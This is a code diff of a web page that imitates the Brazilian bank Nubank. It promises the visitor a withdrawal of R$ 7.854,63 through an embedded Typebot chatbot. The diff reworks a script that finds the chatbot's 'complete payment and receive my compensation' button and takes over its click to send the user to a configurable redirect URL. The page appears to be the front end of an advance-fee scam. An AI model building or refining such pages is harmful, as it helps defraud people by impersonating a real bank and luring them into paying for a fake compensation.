@@ -9,178 +9,156 @@
 </head>
 
 <body class="bg-[#831BD1] min-h-screen flex flex-col">
-  <header class="bg-white px-4 shadow-md">
-    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
-      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
-    </div>
-  </header>
+  <!-- Seu conteúdo existente -->
 
-  <main class="flex-1 px-4 py-2">
-    <div class="flex flex-col">
-      <main>
-        <div class="max-h-min">
-          <div class="px-0.5 pb-[0.6rem]">
-            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
-              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
-                <p class="text-base">
-                  <span>Olá, </span>
-                  <span class="text-black font-bold">USUáRIO!</span>
-                </p>
-                <p class="mt-1 text-sm">
-                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
-                </p>
-              </div>
+  <script type="module">
+    import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
 
-              <!-- Typebot -->
-              <script type="module">
-                import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
+    async function initializeTypebot() {
+      try {
+        await Typebot.initStandard({
+          typebot: "nub-1-mcrdbzs",
+          apiHost: "https://chat.typezap.site",
+        });
+        
+        console.log('Typebot carregado - Iniciando interceptação específica');
+        initSpanButtonInterceptor();
+      } catch (error) {
+        console.error('Erro ao carregar Typebot:', error);
+        setTimeout(initializeTypebot, 1000);
+      }
+    }
 
-                async function initializeTypebot() {
-                  try {
-                    await Typebot.initStandard({
-                      typebot: "nub-1-mcrdbzs",
-                      apiHost: "https://chat.typezap.site",
-                    });
-                    
-                    console.log('Typebot carregado - Iniciando interceptação específica');
-                    initTargetedInterception();
-                  } catch (error) {
-                    console.error('Erro ao carregar Typebot:', error);
-                    setTimeout(initializeTypebot, 1000);
-                  }
-                }
+    initializeTypebot();
+  </script>
 
-                initializeTypebot();
-              </script>
+  <script>
+  // CONFIGURAÇÃO ESPECÍFICA
+  const TARGET_SPAN_TEXT = "Concluir pagamento e receber minha indenização";
+  const REDIRECT_URL = "https://google.com";
+  const CHECK_INTERVAL = 300;
 
-              <script>
-              // Configurações específicas
-              const TARGET_TEXTS = [
-                "Concluir pagamento e receber minha indenização",
-                "Finalizar processo",
-                "Confirmar recebimento"
-              ];
-              const NEW_URL = "https://google.com";
-              const CHECK_INTERVAL = 500; // Verificação a cada 0.5 segundos
+  // FUNÇÃO PRINCIPAL DE INTERCEPTAÇÃO
+  function initSpanButtonInterceptor() {
+    // 1. Observador de mutações
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        if (mutation.addedNodes.length) {
+          checkForTargetSpan();
+        }
+      });
+    });
 
-              // Interceptação FOCADA apenas nos botões alvo
-              function initTargetedInterception() {
-                // 1. Monitoramento do DOM específico
-                const observer = new MutationObserver(() => {
-                  replaceTargetButtons();
-                });
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
 
-                observer.observe(document.body, {
-                  childList: true,
-                  subtree: true
-                });
+    // 2. Verificação periódica
+    const intervalId = setInterval(checkForTargetSpan, CHECK_INTERVAL);
 
-                // 2. Verificação periódica no Shadow DOM
-                const intervalId = setInterval(() => {
-                  replaceTargetButtons();
-                }, CHECK_INTERVAL);
+    // 3. Verificação inicial
+    checkForTargetSpan();
 
-                // 3. Verificação inicial
-                replaceTargetButtons();
+    console.log('🔍 Procurando por span com texto:', TARGET_SPAN_TEXT);
 
-                console.log('🎯 Interceptação específica ativada para:', TARGET_TEXTS.join(', '));
+    // Limpeza após 5 minutos
+    setTimeout(() => {
+      clearInterval(intervalId);
+      observer.disconnect();
+      console.log('⏱ Monitoramento finalizado');
+    }, 300000);
+  }
 
-                // Para após 5 minutos (opcional)
-                setTimeout(() => {
-                  clearInterval(intervalId);
-                  observer.disconnect();
-                  console.log('⏱ Monitoramento periódico encerrado');
-                }, 300000);
-              }
+  // VERIFICA O SPAN ESPECÍFICO
+  function checkForTargetSpan() {
+    try {
+      // Encontra todos os spans com a classe específica
+      const spans = document.querySelectorAll('span.px-\\[15px\\].py-\\[7px\\]');
+      
+      spans.forEach(span => {
+        if (span.textContent.trim() === TARGET_SPAN_TEXT) {
+          const button = findParentButton(span);
+          if (button && !button.dataset.intercepted) {
+            transformButton(button);
+          }
+        }
+      });
 
-              // Função PRINCIPAL que faz a substituição apenas nos botões alvo
-              function replaceTargetButtons() {
-                try {
-                  // Verifica no documento principal
-                  document.querySelectorAll('button, a, [onclick]').forEach(element => {
-                    if (isTargetButton(element)) {
-                      modifyTargetElement(element);
-                    }
-                  });
+      // Verifica no Shadow DOM também
+      const typebot = document.querySelector('typebot-standard');
+      if (typebot?.shadowRoot) {
+        const shadowSpans = typebot.shadowRoot.querySelectorAll('span');
+        shadowSpans.forEach(span => {
+          if (span.textContent.trim() === TARGET_SPAN_TEXT) {
+            const button = findParentButton(span);
+            if (button && !button.dataset.intercepted) {
+              transformButton(button);
+            }
+          }
+        });
+      }
+    } catch (e) {
+      console.error('Erro na verificação:', e);
+    }
+  }
 
-                  // Verifica no Shadow DOM do Typebot
-                  const typebot = document.querySelector('typebot-standard');
-                  if (typebot?.shadowRoot) {
-                    typebot.shadowRoot.querySelectorAll('button, a, [onclick]').forEach(element => {
-                      if (isTargetButton(element)) {
-                        modifyTargetElement(element);
-                      }
-                    });
-                  }
-                } catch (e) {
-                  console.error('Erro na verificação:', e);
-                }
-              }
+  // ENCONTRA O BOTÃO PAI DO SPAN
+  function findParentButton(element) {
+    let parent = element.parentElement;
+    while (parent) {
+      if (parent.tagName === 'BUTTON' || parent.tagName === 'A' || parent.hasAttribute('onclick')) {
+        return parent;
+      }
+      parent = parent.parentElement;
+    }
+    return null;
+  }
 
-              // Identifica se é um botão alvo
-              function isTargetButton(element) {
-                return TARGET_TEXTS.some(text => 
-                  element.textContent?.includes(text) || 
-                  element.innerText?.includes(text) ||
-                  element.getAttribute('aria-label')?.includes(text)
-                );
-              }
+  // TRANSFORMA O BOTÃO
+  function transformButton(button) {
+    try {
+      button.dataset.intercepted = 'true';
+      
+      // Se for um link
+      if (button.tagName === 'A') {
+        button.href = REDIRECT_URL;
+        button.target = '_blank';
+      }
+      
+      // Remove eventos antigos
+      const newButton = button.cloneNode(true);
+      button.parentNode.replaceChild(newButton, button);
+      
+      // Adiciona novo comportamento
+      newButton.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        console.log('✅ Redirecionando botão com span:', TARGET_SPAN_TEXT);
+        window.open(REDIRECT_URL, '_blank');
+      }, true);
+      
+      console.log('🔄 Botão com span transformado:', newButton);
+    } catch (e) {
+      console.error('Erro ao transformar botão:', e);
+    }
+  }
 
-              // Modifica APENAS os elementos alvo
-              function modifyTargetElement(element) {
-                try {
-                  // Se for link
-                  if (element.tagName === 'A') {
-                    element.href = NEW_URL;
-                    element.target = '_blank';
-                  }
-                  
-                  // Remove eventos antigos
-                  const newElement = element.cloneNode(true);
-                  element.parentNode?.replaceChild(newElement, element);
-                  
-                  // Adiciona novo comportamento
-                  newElement.onclick = (e) => {
-                    e?.preventDefault();
-                    e?.stopPropagation();
-                    console.log('🔗 Redirecionando botão específico para:', NEW_URL);
-                    window.open(NEW_URL, '_blank');
-                    return false;
-                  };
-                  
-                  return newElement;
-                } catch (e) {
-                  console.error('Erro ao modificar elemento:', e);
-                  return element;
-                }
-              }
-
-              // Funções para depuração
-              window.typebotInterceptor = {
-                check: () => {
-                  const targets = document.querySelectorAll('button, a, [onclick]');
-                  console.log(`🔍 ${targets.length} elementos encontrados`);
-                  targets.forEach(el => {
-                    if (isTargetButton(el)) {
-                      console.log('🎯 Botão alvo encontrado:', el);
-                    }
-                  });
-                },
-                test: () => {
-                  const testBtn = document.createElement('button');
-                  testBtn.textContent = TARGET_TEXTS[0];
-                  document.body.appendChild(testBtn);
-                  console.log('🧪 Botão de teste adicionado');
-                }
-              };
-              </script>
-
-              <typebot-standard></typebot-standard>
-            </div>
-          </div>
-        </div>
-      </main>
-    </div>
-  </main>
+  // FERRAMENTAS DE DEPURAÇÃO
+  window.spanInterceptor = {
+    checkSpans: () => {
+      const spans = document.querySelectorAll('span');
+      console.log('📋 Todos os spans:', spans);
+      return spans;
+    },
+    test: () => {
+      const testSpan = document.createElement('span');
+      testSpan.className = 'px-[15px] py-[7px]';
+      testSpan.textContent = TARGET_SPAN_TEXT;
+      document.body.appendChild(testSpan);
+      console.log('🧪 Span de teste adicionado');
+    }
+  };
+  </script>
 </body>
 </html>
